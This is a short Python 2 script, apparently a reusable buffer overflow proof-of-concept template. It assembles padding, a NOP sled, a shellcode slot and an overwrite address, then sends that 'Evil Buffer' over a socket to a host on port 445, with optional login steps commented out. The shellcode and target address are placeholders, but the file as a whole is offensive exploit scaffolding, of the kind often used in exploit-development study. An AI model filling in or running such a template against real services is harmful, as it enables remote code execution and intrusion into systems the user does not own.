#!/usr/bin/python2
# author: dead1
# python2 buffer overflow template
import socket

## host information
host="10.0.0.1"
host_port=445
## host_user=""
## host_pass=""

## size before EIP/RIP over-write
buffer_size=240

## address to overwrite EIP/RIP with
eip="\xef\xbe\xad\xde"	## 0xdeadbeef

## shellcode (if any)
shellcode=""
shellcode+=""

## nop sled (if any)
nop_sled="\x90" * 10

## build buffer
padding="\x41" * (buffer_size - len(nop_sled) - len(shellcode))
the_buffer=padding + nop_sled + shellcode
the_buffer=the_buffer + eip

## information
print ">> Dead1's Buffer Overflow POC <<"
print " Size of Buffer:\t",buffer_size
print " Size of Padding:\t",len(padding)
print " Size of NOP Sled:\t",len(nop_sled)
print " Size of Shellcode:\t",len(shellcode)

## connect socket and send buffer
pwn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "\n[*] Connecting to {host} port {host_port}"
pwn.connect((host, host_port))
print "[*] Waiting for Response"
msg=pwn.recv(1024)
print msg
## pwn.send("user " + host_user + "\n")
## msg=pwn.recv(1024)
## print msg
## pwn.send("pass " + host_pass + "\n")
## msg=pwn.recv(1024)
## print msg
print "\n[*] Sending Evil Buffer !"
pwn.send(the_buffer + "\n")
print "[*] Waiting for Response"
msg=pwn.recv(4096)
print "[*] Response Recieved"
print msg
print "\n[*] Closing Connection"
pwn.close()
print "[*] Done !" 
